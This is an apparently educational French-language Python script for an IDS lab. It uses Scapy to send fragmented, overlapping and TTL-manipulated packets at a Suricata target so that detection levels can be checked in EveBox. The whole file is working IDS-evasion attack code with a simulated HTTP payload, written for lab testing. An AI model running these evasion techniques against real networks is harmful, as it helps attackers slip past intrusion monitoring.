#!/usr/bin/env python3
"""
IDS Lab - Attaque par fragmentation IP avec Scapy
==================================================
Ce script démontre comment fragmenter des paquets pour éviter la détection IDS.

Usage:
    sudo python3 fragment_attack.py <target_ip> [fragment_size]

Exemple:
    sudo python3 fragment_attack.py 172.19.0.3 8
"""

import sys
import os

# Vérifier si on est root
if os.geteuid() != 0:
    print("⚠️  Ce script nécessite les privilèges root (pour envoyer des raw packets)")
    print("   Relancez avec: sudo python3 fragment_attack.py <target>")
    sys.exit(1)

try:
    from scapy.all import *
except ImportError:
    print("❌ Scapy n'est pas installé.")
    print("   Installez-le avec: pip3 install scapy")
    sys.exit(1)

def fragment_attack(target, frag_size=8):
    """
    Envoie une requête HTTP fragmentée en petits morceaux.

    Args:
        target: IP de la cible
        frag_size: Taille de chaque fragment (8 = minimum)
    """
    print(f"""
╔══════════════════════════════════════════════════════════════╗
║            Attaque par Fragmentation IP                      ║
╠══════════════════════════════════════════════════════════════╣
║  Target: {target}
║  Fragment size: {frag_size} bytes
╚══════════════════════════════════════════════════════════════╝
""")

    # Payload HTTP malveillant (simulé)
    payload = "GET /EVIL_PAYLOAD HTTP/1.1\r\nHost: target\r\nUser-Agent: NmapScan\r\n\r\n"

    # Créer le paquet complet
    ip = IP(dst=target)
    tcp = TCP(sport=RandShort(), dport=80, flags="S")

    # Premier test: SYN normal
    print("📍 Test 1: SYN normal (référence)")
    ans = sr1(ip/tcp, timeout=2, verbose=0)
    if ans:
        print(f"   Réponse: {ans.summary()}")
    else:
        print("   Pas de réponse (filtré ou fermé)")

    # Deuxième test: HTTP fragmenté
    print("\n📍 Test 2: Paquet HTTP fragmenté")

    # Construire le paquet complet
    full_pkt = ip/TCP(sport=RandShort(), dport=80, flags="PA")/Raw(load=payload)

    # Fragmenter manuellement
    fragments = fragment(full_pkt, fragsize=frag_size)

    print(f"   Nombre de fragments: {len(fragments)}")
    for i, frag in enumerate(fragments):
        print(f"   Fragment {i+1}: {len(frag)} bytes, offset={frag.frag}, MF={frag.flags.MF}")
        send(frag, verbose=0)

    print("\n✅ Fragments envoyés!")
    print("\n💡 Vérifiez les alertes dans EveBox: http://localhost:5636")
    print("   - Niveau 1-3: Probable que les fragments passent")
    print("   - Niveau 4-5: Fragmentation devrait être détectée")

def overlapping_fragments(target):
    """
    Technique avancée: fragments superposés pour confondre l'IDS.
    """
    print(f"\n📍 Test 3: Fragments superposés (overlapping)")

    ip = IP(dst=target)

    # Créer des fragments qui se chevauchent
    # Le premier fragment contient du padding innocent
    frag1 = ip/TCP(sport=12345, dport=80)/Raw(load="AAAA")
    frag1.flags = "MF"
    frag1.frag = 0

    # Le second fragment écrase une partie du premier avec le vrai payload
    frag2 = ip/TCP(sport=12345, dport=80)/Raw(load="GET /evil HTTP/1.1")
    frag2.frag = 1  # Overlap!

    send(frag1, verbose=0)
    send(frag2, verbose=0)

    print("   Fragments superposés envoyés!")
    print("   Cette technique exploite les différences de réassemblage IP/TCP")

def ttl_evasion(target):
    """
    Technique d'évasion par TTL: envoyer des paquets avec TTL court
    qui expirent avant l'IDS mais après le routeur.
    """
    print(f"\n📍 Test 4: Manipulation TTL")

    for ttl in [1, 3, 64, 128, 255]:
        pkt = IP(dst=target, ttl=ttl)/TCP(dport=80, flags="S")
        ans = sr1(pkt, timeout=1, verbose=0)
        status = "✓ Réponse" if ans else "✗ Timeout/TTL expiré"
        print(f"   TTL={ttl:3d}: {status}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        # Essayer de trouver automatiquement la cible suricata
        try:
            import subprocess
            result = subprocess.run(
                ["docker", "inspect", "target_suricata", "--format",
                 "{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}"],
                capture_output=True, text=True
            )
            if result.returncode == 0 and result.stdout.strip():
                target = result.stdout.strip()
                print(f"🎯 Cible auto-détectée: {target}")
            else:
                print(__doc__)
                sys.exit(1)
        except:
            print(__doc__)
            sys.exit(1)
    else:
        target = sys.argv[1]

    frag_size = int(sys.argv[2]) if len(sys.argv) > 2 else 8

    fragment_attack(target, frag_size)
    overlapping_fragments(target)
    ttl_evasion(target)
